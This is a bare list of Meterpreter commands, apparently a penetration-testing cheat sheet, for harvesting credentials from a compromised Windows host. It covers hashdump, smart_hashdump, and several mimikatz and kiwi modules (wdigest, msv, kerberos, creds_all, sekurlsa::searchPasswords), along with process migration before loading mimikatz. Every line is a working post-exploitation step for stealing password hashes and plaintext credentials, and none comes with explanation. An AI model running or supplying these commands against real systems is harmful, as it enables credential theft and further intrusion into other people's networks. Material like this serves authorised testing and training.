	Meterpreter > run hashdump 
	&
	Meterpreter > mimikatz_command -f samdump::hashes
	&
	Meterpreter > load mimikatz
	Meterpreter > wdigest
	&
	Meterpreter > load mimikatz
	Meterpreter > msv
	Meterpreter > kerberos
	&
	Meterpreter > load kiwi
	Meterpreter > creds_all
	&
	Meterpreter > migrate PID
	Meterpreter > load mimikatz
	Meterpreter > mimikatz_command -f sekurlsa::searchPasswords
	&
	Meterpreter > run windows/gather/smart_hashdump